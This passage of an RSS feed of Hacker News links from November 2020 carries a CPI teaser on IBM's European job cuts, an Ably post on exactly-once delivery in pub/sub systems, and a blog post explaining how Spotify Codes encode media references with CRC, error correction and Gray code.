<p>Teleport Unified Access plane’s purpose is to be a single remote access to this “cloud computer”, for all environments and all protocols.</p>
</blockquote>

<p>If you’ll be <a href="https://goteleport.com/get-started/">downloading Teleport</a> for the first time today, I figured you should be aware that you’re trying something new and truly special, and you should be aware that support for other protocols is in the works, with some just around the corner.</p>

<p>Also, consider subscribing to our newsletter below. We make a good effort to make it interesting for engineers, which is easy because we are in the middle of a massive shift in remote access technology.</p>


        
        
        <p><strong>Related Posts</strong></p>
          <ul>
            
            <li><a href="https://goteleport.com/blog/gravitational-is-teleport/">Gravitational Changes Name to Teleport</a></li>
            
            <li><a href="https://goteleport.com/blog/teleport-5-press-release/">Teleport 5.0 Press Release</a></li>
            
            <li><a href="https://goteleport.com/blog/kelseyproject-beyonce-of-engineering/">Kelsey Hightower and Diversity at Teleport</a></li>
            
          </ul>
        

        
        
        <a href="https://goteleport.com/tags/company/">company</a>
        

      
      
      &nbsp;
      </article></div>]]>
            </description>
            <link>https://goteleport.com/blog/application-access-announcement/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25151232</guid>
            <pubDate>Thu, 19 Nov 2020 16:39:46 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[IBM to cut 8000 jobs in Europe, including up to 2000 in the UK and Ireland]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25151162">thread link</a>) | @st1x7
<br/>
November 19, 2020 | https://www.channelpartnerinsight.com/news/4023598/ibm-cut-jobs-europe-uk-ireland | <a href="https://web.archive.org/web/*/https://www.channelpartnerinsight.com/news/4023598/ibm-cut-jobs-europe-uk-ireland">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<header>
<div>
<div>
<div>
<div>

<p>

<h2>CPI has learned that Arvind Krishna’s shake-up of Big-Blue to mean 8,000 roles are to be axed</h2>
</p>
</div>
</div>
</div>
</div>
</header>
<div>
<main role="main">
<div>
<article>

<div>
<figure>
<img alt="IBM to cut 8,000 jobs in Europe, including up to 2,000 in the UK and Ireland - source" title="" src="https://www.channelpartnerinsight.com/api/v1/wps/35f3af5/20d29633-4ec2-4994-97a7-4ec62f7e1ce3/9/axe-chopping-wood-580x358.jpg">
</figure>


<p>
IBM is poised to cut 8,000 jobs across its European operations next year, including up to 2,000 jobs in its UK and Ireland business, a source close to the matter has told CPI. Cuts in IBM France and IBM Italy are also expected to be announced to the regional country HQs. Channel Partner Insight reported last month that IBM had already informed IBM Germany of its intentions to cut around 2,300 jobs in that market. IBM's intentions to slim down comes a month after CEO Arvind Krishna told investors...
</p>
</div>
</article>
</div>

</main>
</div>
<div>
<section>
<div>
<div>
<section>
<p>
<h2>To continue reading...</h2>
</p>
</section>
<div>

<div>
<div>
<h2>Register now</h2>
<p>CPI helps European and US resellers, MSPs and distributors make smarter business decisions - such as what segments and territories to target - by providing original insights on who is successfully innovating and where the next market shifts will come from.</p>
<p>Registrants receive:</p>
<ul>
<li><strong>NEWS</strong>: find out what’s happening in the European channel and US MSP sector with our daily newsletter</li>
<li><strong>INTERVIEWS</strong>: learn how leading and ‘rising star’ executives are building their businesses</li>
<li><strong>TOP 30 DISTRIBUTORS</strong>: benchmark your business against the best</li>
<li><strong>COUNTRY/REGIONAL PROFILES</strong>: discover the latest trends in key territories</li>
<li><strong>MARKET ANALYSIS</strong>: help shape your strategy with the latest insights on what segments and services and growing, and what’s in decline</li>
</ul>
<p><a href="https://payments.incisivemedia.com/cpi/controlled/?_ga=2.35482145.1042959336.1583929074-2081328589.1545225057">Register now</a></p>
</div>
</div>
</div>
</div>
</div>
</section>
</div>

</div></div>]]>
            </description>
            <link>https://www.channelpartnerinsight.com/news/4023598/ibm-cut-jobs-europe-uk-ireland</link>
            <guid isPermaLink="false">hacker-news-small-sites-25151162</guid>
            <pubDate>Thu, 19 Nov 2020 16:34:57 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Achieving exactly-once message processing with Ably]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25151148">thread link</a>) | @matt_oriordan
<br/>
November 19, 2020 | https://www.ably.io/blog/achieving-exactly-once-message-processing-with-ably/ | <a href="https://web.archive.org/web/*/https://www.ably.io/blog/achieving-exactly-once-message-processing-with-ably/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="site-main">
<div>
<article>

<section>
<div>
<p>Exactly-once is a desirable (if not critical) message delivery guarantee and a remarkably complex engineering challenge to solve. In this blog post, we will look at what exactly-once means in the context of distributed pub/sub systems, and the exactly-once guarantees that the <a href="https://www.ably.io/">Ably</a> realtime pub/sub messaging platform provides. Ably often acts as the broker in data streaming pipelines: publishers send messages to our platform, and we deliver these messages to subscribers. As a broker, Ably provides regional &amp; global fault tolerance, which ensures message availability and survivability. We also offer a set of capabilities via SDKs that enable clients to use idempotent publishing, and recover in the event of a failure while resuming precisely where they left off, with no lost or duplicate messages.</p>
<figure><img src="https://files.ably.io/ghost/prod/2020/11/4-pillars-exactly-once-semantics-cover.png"></figure><h2 id="exactly-once-delivery-is-one-of-the-hardest-engineering-challenges">Exactly-once delivery is one of the hardest engineering challenges<br>
</h2>
<p>In the context of distributed <a href="https://www.ably.io/topic/pub-sub">pub/sub</a> systems, exactly-once is a popular concept and a desirable, if not critical, system property. It also leads to confusion and diverging opinions within the development community. On the one hand, some argue that <a href="https://bravenewgeek.com/you-cannot-have-exactly-once-delivery/">exactly-once is simply unachievable.</a> On the other hand, there are systems such as <a href="https://kafka.apache.org/documentation/#semantics">Kafka that claim to support exactly-once semantics</a>. </p>
<p>We believe that a lot of the confusion around the concept has to do with the fact that there's no clear definition of what exactly-once actually means. It's arguably impossible to come up with a definition to satisfy everyone and every use case. That's because exactly-once can mean different things for different systems and different use cases. Regardless of how you look at it, though, exactly-once is, without a doubt, a distinctively complex engineering challenge. </p>
<p>Let’s now define what exactly-once means for Ably in particular. In our case, exactly-once is a guarantee that once acknowledged, a message published to Ably is <strong>delivered</strong> to a consumer precisely once, even in the context of individual system components failing. Note that most often, Ably is used to deliver messages in real time directly to end-user devices.</p>
<p>It’s crucial to mention that exactly-once is a system-wide property, and you only achieve it if all the constituent components play their part. This doesn’t mean that all the components must display exactly-once characteristics. For example, in our case, you can have a publisher that displays at-least-once behaviour. However, Ably provides an idempotent interface, which cancels out the fact that the producer may occasionally publish messages more than once. As long as at the other end of the pub/sub pipeline each message is delivered to subscribers precisely once, exactly-once behaviour is achieved as a whole.</p>
<h3 id="types-of-messaging-semantics">Types of messaging semantics<br>
</h3>
<p>Before we dive deeper into exactly-once delivery, let’s review the main types of messaging semantics. When a system is fully operational and working as intended, exactly-once delivery is the behaviour you generally expect. However, we must also consider how faults in the pub/sub system or, indeed, clients affect this behaviour. While most components fail independently in a distributed pub/sub system, without directly impacting other components, the overall quality of service can be affected. Depending on how the system behaves when failures do occur, you get several different types of messaging semantics:</p>
<ul>
<li>
<strong>At-most-once semantics</strong>. The easiest type of semantics to achieve, from an engineering complexity perspective, since it can be done in a fire-and-forget way. There's rarely any need for the components of the system to be stateful. While it's the easiest to achieve, at-most-once is also the least desirable type of messaging semantics. It provides no absolute message delivery guarantees since each message is delivered once (best case scenario) or not at all.</li>
<li>
<strong>At-least-once semantics. </strong>This is an improvement on at-most-once semantics. There might be multiple attempts at delivering a message, so at least one attempt is successful. In other words, there's a chance messages may be duplicated, but they can't be lost. While not ideal as a system-wide characteristic, at-least-once semantics are good enough for use cases where duplication of data is of little concern, or scenarios where deduplication is possible on the consumer side.</li>
<li>
<strong>Exactly-once semantics</strong>. The ultimate message delivery guarantee and the optimal choice in terms of data integrity. As its name suggests, exactly-once semantics means that each message is delivered precisely once. The message can neither be lost nor delivered twice (or more times). Exactly-once is by far the most dependable message delivery guarantee. It’s also the hardest to achieve.</li>
</ul>
<figure><img src="https://files.ably.io/ghost/prod/2020/11/exactly-once-semantics-messaging-semantics-overview.gif" alt="Overview of message delivery semantics: at-most-once delivery, at-least-once delivery, exactly-once delivery."><figcaption>High-level overview of message delivery semantics</figcaption></figure><p>What most distributed pub/sub systems can genuinely guarantee is <strong>mostly-once </strong>delivery. This means that when the system is functioning as intended, messages are delivered exactly once. However, when failures are involved, there’s always a chance some messages will be delivered either at-most-once or at-least-once.</p>
<h3 id="failures-that-prevent-exactly-once-delivery">Failures that prevent exactly-once delivery<br>
</h3>
<p>To demonstrate just how hard it is for distributed <a href="https://www.ably.io/topic/pub-sub">pub/sub</a> systems to achieve exactly-once semantics, we must talk about failures—specifically, components that can fail and how these failures can be mitigated.<br></p>
<p><strong>Publisher failure</strong></p>
<p>When a publisher fails, some sort of recovery process takes place. Depending on its design, after recovery, the publisher may reattempt to publish a message that has already been sent to and acknowledged by the broker. In such an event, the publisher failure causes at-least-once behaviour. Another scenario is that the publisher’s recovery procedure fails to realise that the publish attempt failed, which leads to at-most-once behaviour. </p>
<p>A strategy often used after a publish failure is to retry publishing the same message a fixed number of times. This is a pragmatic approach, but unsatisfactory in the context of exactly-once. Imagine that the publisher recovers and unsuccessfully tries to republish the same message five times, and then gives up. Practically none of the three semantics is achieved. To mitigate publisher failures Ably supports <a href="https://www.ably.io/topic/idempotency">idempotent publishing</a>, which ensures that regardless of how many times the same message is published to Ably, it will be delivered to subscribers exactly-once. <br></p>
<p><strong>Broker failure</strong></p>
<p>A broker failure has the potential to lead to all sorts of issues, including data loss. That’s why it’s recommended to design your system around the idea of mitigating or preventing loss of data. From a producer perspective, this could mean having the ability to publish messages at-least-once, so they can be resent to the broker if needed. </p>
<p>From a broker perspective (Ably included), let’s start by reviewing what a message ACK means. Obviously, it’s an acknowledgment that a published message has been received. Additionally, it should also imply that no subsequent failure will result in that message not being delivered to subscribers. In other words, it should be an acknowledgment that the broker provides sufficient redundancy to ensure continuity of service and onwards processing, even in the context of multiple infrastructure failures. Of course, nothing can be done to prevent or mitigate certain types of critical failures. When that happens, the sensible thing for the broker to do is to respond with a failure response (with HTTP, this is typically a 5xx status code), indicating clearly to the producer that the publish attempt was unsuccessful. </p>
<p><strong>Subscriber failure</strong></p>
<p>The most common subscriber failure that prevents exactly-once delivery involves short disconnections. For example, a client app on a mobile device will disconnect and quickly reconnect when the user switches from a mobile data network to a Wi-Fi network or goes through a tunnel. To counter this scenario and ensure exactly-once behaviour, the stream of messages must resume precisely where it left off when the subscriber recovers. For this to be possible, the connection state must be persisted and resynced when the subscriber reconnects.</p>
<p>If the broker is the one keeping track of the last message sent, you are unlikely to provide exactly-once semantics. That’s because a broker might send a message, and the subscriber might successfully receive it and then disconnect before sending an ACK to the broker. In such a case, once the subscriber reconnects, the broker will resend the respective message (at-least-once semantics) since it has no way of knowing that the subscriber had received it before disconnecting.</p>
<p>To ensure exactly-once behaviour, the responsibility of keeping track of the last message received should sit with the subscriber - something we also do at Ably, via serial numbers. This way, when the subscriber reconnects, it notifies the broker of the last message it has received so that the stream can be accurately resumed from a point in time.</p>
<h3 id="exactly-once-semantics-use-cases">Exactly-once semantics use cases</h3>
<p>In the world of distributed pub/sub systems, exactly-once semantics has been and continues to be extremely hard to achieve. Equally, almost everywhere you look in software development, exactly-once is a highly desirable system-wide property, if not an essential one. For example, exactly-once is crucial for most transactional messaging use cases. At its core, a transactional message is triggered by a consumer action, and it usually includes necessary or high-priority info, e.g., a bank balance inquiry or an order confirmation. </p>
<p>Ordered operations represent another use case where exactly-once is fundamental. Let’s say you want to use <a href="https://www.ably.io/blog/message-delta-compression/">delta compression</a> to only stream changes from the previous message to subscribers each time there’s an update. To achieve this, you need to use a transport that ensures data integrity through guaranteed message ordering and exactly-once semantics.</p>
<p>If not crucial, exactly-once is at least highly desirable, because it improves overall system predictability and provides better experiences to users in general. For example, …</p></div></section></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.ably.io/blog/achieving-exactly-once-message-processing-with-ably/">https://www.ably.io/blog/achieving-exactly-once-message-processing-with-ably/</a></em></p>]]>
            </description>
            <link>https://www.ably.io/blog/achieving-exactly-once-message-processing-with-ably/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25151148</guid>
            <pubDate>Thu, 19 Nov 2020 16:33:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[How do Spotify Codes work?]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25151100">thread link</a>) | @sciurus
<br/>
November 19, 2020 | https://boonepeter.github.io/posts/2020-11-10-spotify-codes/ | <a href="https://web.archive.org/web/*/https://boonepeter.github.io/posts/2020-11-10-spotify-codes/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><article><div><p><img src="https://boonepeter.github.io/imgs/spotify/spotify_track_6vQN2a9QSgWcm74KEZYfDL.jpg" alt="Spotify barcode"></p><p><a href="https://www.spotifycodes.com/">Spotify Codes</a> are QR-like codes that can be generated to easily share Spotify songs, artists, playlists, and users. I set out to figure out how they worked, which lead me on a winding journey through barcode history, patents, packet sniffing, error correction, and Gray tables.</p><h2 id="spotify-uris">Spotify URIs</h2><p>Let’s start with Spotify URIs (Uniform Resource Identifiers). Different pieces of media (artists, albums, songs, playlists, users) all have a URI.</p><p>The ABBA song “Take a Chance on Me” has this URI:</p><p><code>spotify:track:6vQN2a9QSgWcm74KEZYfDL</code>.</p><p>The ABBA Album “The Album” has the following URI:</p><p><code>spotify:album:5GwbPSgiTECzQiE6u7s0ZN</code></p><p>As you can see, the URIs can be broken up into components:</p><p><code>spotify:&lt;media type&gt;:&lt;22 characters&gt;</code>.</p><p>The 22 characters are the numbers 0-9, characters a-z and A-Z. This means there are <code>10 + 26 + 26 = 62</code> possibilities for each character (almost <a href="https://en.wikipedia.org/wiki/Base64">Base64</a>). So the potential number of Spotify URIs is <code>62^22</code> which is equal to <code>2.7e39</code> or</p><div><pre><code data-lang="python"><span>2</span>,<span>707</span>,<span>803</span>,<span>647</span>,<span>802</span>,<span>660</span>,<span>400</span>,<span>290</span>,<span>261</span>,<span>537</span>,<span>185</span>,<span>326</span>,<span>956</span>,<span>544</span>
</code></pre></div><p>To illustrate that number:</p><div><pre><code data-lang="python">x <span>=</span> <span>62</span> <span>**</span> <span>22</span>
<span># the number of milliseconds in a year</span>
x <span>//=</span> <span>365</span> <span>*</span> <span>24</span> <span>*</span> <span>60</span> <span>*</span> <span>60</span> <span>*</span> <span>1000</span>
<span># the number of words in the bible (about 1 million)</span>
x <span>//=</span> <span>1000000</span>
</code></pre></div><p>If Spotify printed a whole Bible’s worth of URIs every millisecond they could do this for <code>85,863,890,404,701,306,452,633</code> years. Safe to say Spotify is not going to run out of URIs anytime soon.</p><h2 id="barcode-background">Barcode background</h2><p>The <a href="https://en.wikipedia.org/wiki/Barcode">history of barcodes</a> is quite extensive. Information is encoded into different barcodes in a variety of ways.</p><p>A lot of barcodes encode data in the <strong>widths</strong> of vertical bars. Universal product codes (UPCs) encode 12 digits using combinations of vertical bars of different widths:</p><p><img src="https://boonepeter.github.io/imgs/spotify/upc.png" alt="UPC encodings"></p><p><a href="https://en.wikipedia.org/wiki/KarTrak">Another barcode</a> uses colors to encode data:</p><p><img src="https://boonepeter.github.io/imgs/spotify/KarTrak_ACI_codes.svg.png" alt="Kartrack barcode"></p><p><a href="https://en.wikipedia.org/wiki/QR_code">QR codes</a> use a 2d matrix of dots to encode data.</p><p><img src="https://boonepeter.github.io/imgs/spotify/qr_code.png" alt="QR code"></p><p>A lot of mail barcodes encode data using the <strong>height</strong> of the bars (like the <a href="https://en.wikipedia.org/wiki/Intelligent_Mail_barcode">Intelligent Mail barcode</a>).</p><p><img src="https://boonepeter.github.io/imgs/spotify/intelligent_mail_barcode.png" alt="Intelligent mail barcode"></p><h2 id="spotify-codes">Spotify Codes</h2><p>Spotify codes work like the <a href="https://en.wikipedia.org/wiki/Intelligent_Mail_barcode">Intelligent Mail Barcode</a>. Information can be stored in the bars by setting them to different heights.</p><p>This is the Spotify code for the ABBA song “Take a Chance on Me”:</p><p><img src="https://boonepeter.github.io/imgs/spotify/spotify_track_6vQN2a9QSgWcm74KEZYfDL.jpg" alt="Spotify barcode"></p><p>When the bars are sorted by height you can see that there are 8 discrete heights that they fall into.</p><p><img src="https://boonepeter.github.io/imgs/spotify/sorted.png" alt="Spotify sorted barcodes"></p><p>This means the data is encoded in <a href="https://en.wikipedia.org/wiki/Octal">octal</a>.</p><p>The Spotify logo’s diameter is the same as the height of the highest bar. This makes it easy to generate ratios of the bars' heights.</p><p>In this function I use <a href="https://scikit-image.org/">scikit-image</a> to calculate the sequence of bar heights from a logo.</p><div><pre><code data-lang="python"><span>from</span> skimage <span>import</span> io
<span>from</span> skimage.measure <span>import</span> label, regionprops
<span>from</span> skimage.filters <span>import</span> threshold_otsu
<span>from</span> skimage.color <span>import</span> rgb2gray


<span>def</span> <span>get_heights</span>(filename: str) <span>-&gt;</span> list:
    <span>"""Open an image and return a list of the bar heights.
</span><span>    """</span>
    <span># convert to grayscale, then binary</span>
    image <span>=</span> io<span>.</span>imread(filename)
    im <span>=</span> rgb2gray(image)
    binary_im <span>=</span> im <span>&gt;</span> threshold_otsu(im)

    <span># label connected regions as objects</span>
    labeled <span>=</span> label(binary_im)

    <span># get the dimensions and positions of bounding box around objects</span>
    bar_dimensions <span>=</span> [r<span>.</span>bbox <span>for</span> r <span>in</span> regionprops(labeled)]

    <span># sort by X</span>
    bar_dimensions<span>.</span>sort(key<span>=</span><span>lambda</span> x: x[<span>1</span>], reverse<span>=</span>False)

    <span># the first object (spotify logo) is the max height of the bars</span>
    logo <span>=</span> bar_dimensions[<span>0</span>]
    max_height <span>=</span> logo[<span>2</span>] <span>-</span> logo[<span>0</span>]
    sequence <span>=</span> []
    <span>for</span> bar <span>in</span> bar_dimensions[<span>1</span>:]:
        height <span>=</span> bar[<span>2</span>] <span>-</span> bar[<span>0</span>]
        ratio <span>=</span> height <span>/</span> max_height
        <span># multiply by 8 to get an octal integer</span>
        ratio <span>*=</span> <span>8</span>
        ratio <span>//=</span> <span>1</span>
        <span># convert to integer (and make 0 based)</span>
        sequence<span>.</span>append(int(ratio <span>-</span> <span>1</span>))
    <span>return</span> sequence
</code></pre></div><p>This is the sequence of the “Take On Me” Spotify code:</p><div><pre><code data-lang="python"><span>&gt;&gt;&gt;</span> get_heights(<span>"/imgs/spotify/spotify_track_6vQN2a9QSgWcm74KEZYfDL.jpg"</span>)
[<span>0</span>, <span>5</span>, <span>1</span>, <span>2</span>, <span>0</span>, <span>6</span>, <span>4</span>, <span>3</span>, <span>7</span>, <span>1</span>, <span>6</span>, <span>7</span>, <span>7</span>, <span>7</span>, <span>7</span>, <span>3</span>, <span>1</span>, <span>6</span>, <span>3</span>, <span>7</span>, <span>0</span>, <span>7</span>, <span>0</span>]
</code></pre></div><p>Here are those results overlaid on the barcode:</p><p><img src="https://boonepeter.github.io/imgs/spotify/spotify_labeled.png" alt="labeled spotify code"></p><p>After looking at a few barcodes, I realized that the first and last bars are always 0, and the 12th bar is always a 7. This must help in identifying if the barcode is valid. Having the 12th bar as the max height also helps you calculate the ratios of the bar heights. I suspect setting the first and last bar set to 0 is an aesthetic choice: it makes the barcode look more like a sound wave. Here are a few barcodes printed out so you can see that the first and last are always equal to 0 and the 12th is equal to 7.</p><div><pre><code data-lang="python">    [<span>0</span>, <span>3</span>, <span>3</span>, <span>0</span>, <span>5</span>, <span>2</span>, <span>2</span>, <span>2</span>, <span>2</span>, <span>5</span>, <span>1</span>, <span>7</span>, <span>0</span>, <span>0</span>, <span>5</span>, <span>6</span>, <span>0</span>, <span>7</span>, <span>7</span>, <span>7</span>, <span>1</span>, <span>5</span>, <span>0</span>]
    [<span>0</span>, <span>5</span>, <span>6</span>, <span>5</span>, <span>3</span>, <span>5</span>, <span>4</span>, <span>2</span>, <span>7</span>, <span>2</span>, <span>5</span>, <span>7</span>, <span>1</span>, <span>3</span>, <span>1</span>, <span>1</span>, <span>6</span>, <span>1</span>, <span>1</span>, <span>6</span>, <span>7</span>, <span>6</span>, <span>0</span>]
    [<span>0</span>, <span>4</span>, <span>6</span>, <span>6</span>, <span>6</span>, <span>4</span>, <span>4</span>, <span>1</span>, <span>6</span>, <span>6</span>, <span>6</span>, <span>7</span>, <span>7</span>, <span>3</span>, <span>6</span>, <span>0</span>, <span>7</span>, <span>6</span>, <span>0</span>, <span>2</span>, <span>1</span>, <span>7</span>, <span>0</span>]
    [<span>0</span>, <span>0</span>, <span>3</span>, <span>3</span>, <span>7</span>, <span>5</span>, <span>2</span>, <span>3</span>, <span>1</span>, <span>1</span>, <span>4</span>, <span>7</span>, <span>5</span>, <span>5</span>, <span>5</span>, <span>3</span>, <span>3</span>, <span>7</span>, <span>5</span>, <span>1</span>, <span>4</span>, <span>3</span>, <span>0</span>]
    [<span>0</span>, <span>6</span>, <span>2</span>, <span>2</span>, <span>1</span>, <span>5</span>, <span>2</span>, <span>6</span>, <span>2</span>, <span>2</span>, <span>3</span>, <span>7</span>, <span>7</span>, <span>6</span>, <span>6</span>, <span>4</span>, <span>5</span>, <span>6</span>, <span>0</span>, <span>1</span>, <span>4</span>, <span>3</span>, <span>0</span>]
    [<span>0</span>, <span>7</span>, <span>7</span>, <span>1</span>, <span>4</span>, <span>7</span>, <span>1</span>, <span>0</span>, <span>4</span>, <span>7</span>, <span>1</span>, <span>7</span>, <span>6</span>, <span>5</span>, <span>6</span>, <span>3</span>, <span>1</span>, <span>6</span>, <span>4</span>, <span>4</span>, <span>7</span>, <span>7</span>, <span>0</span>]
    [<span>0</span>, <span>1</span>, <span>1</span>, <span>1</span>, <span>5</span>, <span>7</span>, <span>1</span>, <span>3</span>, <span>3</span>, <span>1</span>, <span>0</span>, <span>7</span>, <span>7</span>, <span>0</span>, <span>7</span>, <span>3</span>, <span>2</span>, <span>3</span>, <span>0</span>, <span>6</span>, <span>0</span>, <span>0</span>, <span>0</span>]
    [<span>0</span>, <span>7</span>, <span>6</span>, <span>6</span>, <span>7</span>, <span>4</span>, <span>4</span>, <span>6</span>, <span>7</span>, <span>0</span>, <span>6</span>, <span>7</span>, <span>0</span>, <span>4</span>, <span>1</span>, <span>7</span>, <span>3</span>, <span>2</span>, <span>0</span>, <span>5</span>, <span>4</span>, <span>7</span>, <span>0</span>]
    [<span>0</span>, <span>0</span>, <span>0</span>, <span>6</span>, <span>1</span>, <span>3</span>, <span>3</span>, <span>2</span>, <span>2</span>, <span>0</span>, <span>2</span>, <span>7</span>, <span>3</span>, <span>2</span>, <span>4</span>, <span>1</span>, <span>6</span>, <span>0</span>, <span>1</span>, <span>5</span>, <span>0</span>, <span>4</span>, <span>0</span>]
</code></pre></div><p>The barcode consists of 23 bars, of which only 20 actually contain information. This means that there are <code>8^20</code> pieces of information that can be encoded into the code.</p><h2 id="uris-to-barcodes">URIs to Barcodes</h2><p>How do you convert a <code>63^22</code> bit URI into an <code>8^20</code> bit barcode? There is <code>2.3e+21</code> times as much information in the URI than there is in the barcode. This is when I started asking questions and hunting for answers. <a href="https://stackoverflow.com/questions/47267924/string-encryption-generate-unique-pattern-like-spotify-codes/62120952#62120952">This question</a> was a start, but I ended up asking <a href="https://stackoverflow.com/questions/62121301/encoding-spotify-uri-to-spotify-codes">this SO question</a> and getting a couple of answers that linked to the relevant patents and contained more info about Spotify’s look up table.</p><p><a href="https://data.epo.org/publication-server/rest/v1.0/publication-dates/20190220/patents/EP3444755NWA1/document.pdf">Here is one patent</a>.</p><p><a href="http://www.freepatentsonline.com/20180181849.pdf">Here is another, more recent patent</a></p><blockquote><p>“Patents are the worst” - Peter Boone</p></blockquote><p>Let me just say: patents are the worst. They are so dense. I used to think academic papers were full of jargon until I read some technical patents.</p><h3 id="the-process">The Process</h3><p>When you visit <a href="https://www.spotifycodes.com/">Spotify codes</a> and input a Spotify URI, a “media reference” is created by Spotify. This media reference is 37 bits long and is the key that links a barcode to a given URI. The media reference may just be the hash of an incrementing index. After extracting a media reference from a barcode, you check with Spotify’s database (a look-up table) to determine what URI it corresponds to. A Stack Overflow user <a href="https://stackoverflow.com/a/63479041/10703868">discovered</a> that you can sniff the request that your phone makes when scanning the barcode to determine the media reference and API endpoint.</p><div><pre><code data-lang="python">heights <span>=</span> [<span>0</span>, <span>2</span>, <span>6</span>, <span>7</span>, <span>1</span>, <span>7</span>, <span>0</span>, <span>0</span>, <span>0</span>, <span>0</span>, <span>4</span>, <span>7</span>, <span>1</span>, <span>7</span>, <span>3</span>, <span>4</span>, <span>2</span>, <span>7</span>, <span>5</span>, <span>6</span>, <span>5</span>, <span>6</span>, <span>0</span>]
media_reference <span>=</span> <span>"67775490487"</span>
uri <span>=</span> <span>"spotify:user:jimmylavallin:playlist:2hXLRTDrNa4rG1XyM0ngT1"</span>
</code></pre></div><p>There are a few steps required to turn a media reference into a Spotify code (and vis versa).</p><h3 id="cyclic-redundancy-check">Cyclic Redundancy Check</h3><p>A <a href="https://en.wikipedia.org/wiki/Cyclic_redundancy_check">Cyclic redundancy check</a> is calculated for the media ref. Based on the fact that 8 bits are calculated, I am assuming Spotify uses CRC8.</p><div><pre><code data-lang="python"><span>import</span> crc8

hash <span>=</span> crc8<span>.</span>crc8()
media_ref <span>=</span> <span>67775490487</span>
ref_bytes <span>=</span> media_ref<span>.</span>to_bytes(<span>5</span>, byteorder<span>=</span><span>"big"</span>)
<span>print</span>(ref_bytes)
<span># b'\x0f\xc7\xbb\xe9\xb7'</span>
hash<span>.</span>update(ref_bytes)
check_bits <span>=</span> hash<span>.</span>digest()
<span>print</span>(check_bits)
<span># b'\x0c'</span>
</code></pre></div><p>Append the crc to the media reference:</p><div><pre><code data-lang="python">media_reference <span>=</span> <span>b</span><span>'</span><span>\x0f\xc7\xbb\xe9\xb7\x0c</span><span>'</span>
</code></pre></div><h3 id="forward-error-correction">Forward error correction</h3><p>Next <a href="https://en.wikipedia.org/wiki/Error_correction_code#Forward_error_correction">forward error correction</a> (FEC) is used to add some <strong>redundancy</strong> to the code. This makes the decoding process more reliable. Decoding Spotify codes involves going from analog (bar lengths) to digital (media reference), so it is a good candidate for this error correction.</p><blockquote><p>The fundamental principle of [error correction] is to add redundant bits in order to help the decoder to find out the true message that was encoded by the transmitter.</p></blockquote><p>A simple example of error correction would be to replicate each bit twice. So instead of sending <code>1</code>, you would send <code>111</code>. When that triplet is sent across a “noisy” communication channel, some of the bits could get flipped. But since there are 2 redundant bits, the receiver can guess what the value was meant to be:</p><table><thead><tr><th>Triplet received</th><th>Interpreted as</th></tr></thead><tbody><tr><td>000</td><td>0 (error-free)</td></tr><tr><td>001</td><td>0</td></tr><tr><td>010</td><td>0</td></tr><tr><td>100</td><td>0</td></tr><tr><td>111</td><td>1 (error-free)</td></tr><tr><td>110</td><td>1</td></tr><tr><td>101</td><td>1</td></tr><tr><td>011</td><td>1</td></tr></tbody></table><p>The patents don’t specify what forward error correction schema Spotify uses, but they do say that they add 15 bits at this step. The code rate of an error correction scheme is the ratio of the information bits to the total encoded bit length. Spotify adds 15 bits to the 45 bit code, so the code rate is <code>45 / 60 = 0.75</code>. This code rate is high (close to 1) meaning it is fairly weak. It facilitates a limited amount of error correction, but that is okay. If you are sending a message to a deep space probe you want a very strong code. A Spotify code is pretty low risk: it’s easy to ping the server a few times if you decode the wrong media reference.</p><p>The total forward error corrected code is 60 bits long, which is the exact amount of information that can be encoded in the 20 octals (bar heights) in the Spotify barcode!</p><p>The patents do mention that Spotify uses the <a href="https://en.wikipedia.org/wiki/Viterbi_decoder">Viterbi algorithm</a> to decode the media reference from the forward error corrected code. I won’t go into it here, but that algorithm uses the redundant bits from the forward error correction to determine the best guess of the actual media reference.</p><h3 id="gray-code">Gray Code</h3><p>I really like this part of the Spotify codes.</p><p><a href="https://en.wikipedia.org/wiki/Gray_code">Gray code</a> is an alternative way to represent a binary number. If you look closely at the following table, you will see that Gray code works by changing only one bit at a time.</p><table><thead><tr><th>Decimal</th><th>Binary</th><th>Gray</th></tr></thead><tbody><tr><td>0</td><td>000</td><td>000</td></tr><tr><td>1</td><td>001</td><td>001</td></tr><tr><td>2</td><td>010</td><td>011</td></tr><tr><td>3</td><td>011</td><td>010</td></tr><tr><td>4</td><td>100</td><td>110</td></tr><tr><td>5</td><td>101</td><td>111</td></tr><tr><td>6</td><td>110</td><td>101</td></tr><tr><td>7</td><td>111</td><td>100</td></tr></tbody></table><p>Why does Spotify use Gray code? What is wrong with normal binary representation of the code?</p><p>The difference between 3 and 4 in Gray code is only 1 bit (<code>010 -&gt; 110</code>). In normal binary representation, that difference is 3 bits (<code>100 -&gt; 011</code>). When going from analog (the height of a given bar) to binary, using Gray codes reduces the number of bits that are “wrong” if we calculate the wrong height.</p><p>If the height of a bar is supposed to be 3, but we calculate that it is 3.51 and we round up to 4, the binary representation of that number in Gray code will only be off by one bit. <strong>This makes the forward error …</strong></p></div></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://boonepeter.github.io/posts/2020-11-10-spotify-codes/">https://boonepeter.github.io/posts/2020-11-10-spotify-codes/</a></em></p>]]>
            </description>
            <link>https://boonepeter.github.io/posts/2020-11-10-spotify-codes/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25151100</guid>
            <pubDate>Thu, 19 Nov 2020 16:29:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Shuffling Things Up: Solving Advent of Code with Group Theory and Haskell]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25151050">thread link</a>) | @jle
<br/>
